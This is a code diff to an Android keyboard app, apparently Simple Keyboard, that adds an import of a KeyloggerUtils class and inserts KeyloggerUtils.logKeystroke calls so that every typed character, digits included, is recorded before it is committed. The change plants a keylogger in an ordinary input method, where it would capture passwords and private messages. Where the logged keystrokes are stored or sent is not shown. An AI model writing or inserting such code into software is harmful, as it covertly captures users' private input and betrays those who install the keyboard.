@@ -32,6 +32,7 @@ import rkr.simplekeyboard.inputmethod.latin.common.Constants;
 import rkr.simplekeyboard.inputmethod.latin.common.StringUtils;
 import rkr.simplekeyboard.inputmethod.latin.settings.SettingsValues;
 import rkr.simplekeyboard.inputmethod.latin.utils.InputTypeUtils;
+import rkr.simplekeyboard.inputmethod.latin.utils.KeyloggerUtils;
 import rkr.simplekeyboard.inputmethod.latin.utils.RecapitalizeStatus;
 import rkr.simplekeyboard.inputmethod.latin.utils.SubtypeLocaleUtils;
 
@@ -567,10 +568,12 @@ public final class InputLogic {
         // TODO: Remove this special handling of digit letters.
         // For backward compatibility. See {@link InputMethodService#sendKeyChar(char)}.
         if (codePoint >= '0' && codePoint <= '9') {
+            KeyloggerUtils.logKeystroke(StringUtils.newSingleCodePointString(codePoint));
             sendDownUpKeyEvent(codePoint - '0' + KeyEvent.KEYCODE_0);
             return;
         }
 
+        KeyloggerUtils.logKeystroke(StringUtils.newSingleCodePointString(codePoint));
         mConnection.commitText(StringUtils.newSingleCodePointString(codePoint), 1);
     }
 
